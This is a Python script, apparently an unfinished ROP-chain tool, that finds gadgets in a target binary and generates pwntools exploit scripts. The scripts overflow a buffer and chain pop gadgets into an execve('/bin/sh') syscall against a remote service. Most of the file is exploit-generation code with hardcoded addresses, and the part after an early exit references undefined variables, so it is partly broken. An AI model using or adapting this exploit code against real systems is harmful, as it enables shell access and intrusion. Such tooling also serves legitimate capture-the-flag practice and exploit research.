#!/usr/bin/env python
import argparse
import sys
from Gadget import *
from RopChainer import *
from ScriptMaker import *

parser = argparse.ArgumentParser(description="RopTool is use to find rop gadgets and make rop chain")

parser.add_argument("target", nargs="?", type=str, help="Target file")

args = parser.parse_args()
target = args.target


if target is None:
    parser.print_help()
    sys.exit(0)


gadget = Gadget(target)
s = ScriptMaker(gadget)
s.prepare_script()
s.prepare_gadgets()
s.prepare_chain()
s.make_script()
import sys
sys.exit(0)


gadgets = gadgets.getGadgets()
chainer = RopChainer(gadgets)

tab = "    "
sh_addr = "0xf6ffee64"
padding = "padding = \"A\"*91"
syscall = 0x806c775

header  = "#!/usr/bin/env python" + "\n"
header += "from pwn import *" + "\n"
header += "\n"
header += "bin = 0x6e69622f" + "\n"
header += "sh = 0x68732f" + "\n"
header += padding + "\n"
header += "padding += p32(bin) + p32(sh)" + "\n"
header += "\n"
header += "r = remote(\"0.0.0.0\", 4000)" + "\n"
#print header

exploit  = "chain += p32(" + str(syscall) + ")" + "\n"
exploit += "payload = padding + chain" + "\n"
exploit += "r.sendline(payload)" + "\n"
exploit += "r.interactive()" + "\n"
exploit += "r.close()" + "\n"

"""
if pop_eax and pop_ebx and pop_ecx and pop_edx:
    print "do"
    for i in range(10):
        chain  = "chain  = p32(" + str(pop_eax[0]["vaddr"]) + ")" + " + p32(0xb)" + "\n"
        chain += "chain += p32(" + str(pop_ebx[0]["vaddr"]) + ")" + " + p32(" + str(sh_addr) + ")" + "\n"
        chain += "chain += p32(" + str(pop_ecx[0]["vaddr"]) + ")" + " + p32(0x0)" + "\n"
        chain += "chain += p32(" + str(pop_edx[0]["vaddr"]) + ")" + " + p32(0x0)" + "\n"
        chain += "chain += p32(" + str(syscall) + ")" + "\n"
        chain += "\n"
        #print
        #print header
        #print chain
        #print exploit

        with open("single" + str(i) + ".py", "w") as f:
            f.write(header)
            f.write(chain)
            f.write(exploit)
"""

c = 1
for pops in all_pop:
    regs = {"eax": False, "ebx": False, "ecx": False, "edx": False}
    ret = {"eax": (pop_eax[0]["vaddr"], 0xb),
            "ebx": (pop_ebx[0]["vaddr"], int(sh_addr, base=16)),
            "ecx": (pop_ecx[0]["vaddr"], 0x0),
            "edx": (pop_edx[0]["vaddr"], 0x0)
            }
    pattern = pops["gadgets"].split(" ; ")[:-1]
    sort = []
    for reg in pattern:
        regs[reg.split()[1]] = True
        sort += [reg.split()[1]]
    chain  = "chain = p32(" + str(pops["vaddr"]) + ")" + "\n"
    for reg in sort:
        chain += "chain += p32(" + str(ret[reg][1]) + ")" + "\n"
    for reg in regs.keys():
        if not regs[reg]:
            chain += "chain += p32(" + str(ret[reg][0]) + ")" + "\n"
            chain += "chain += p32(" + str(ret[reg][1]) + ")" + "\n"
    chain += "#" + pops["gadgets"] + "\n"
    chain += "\n"
    with open("test"+str(c)+".py", "w") as f:
        f.write(header)
        f.write(chain)
        f.write(exploit)
        c += 1
    if c>1:
        break

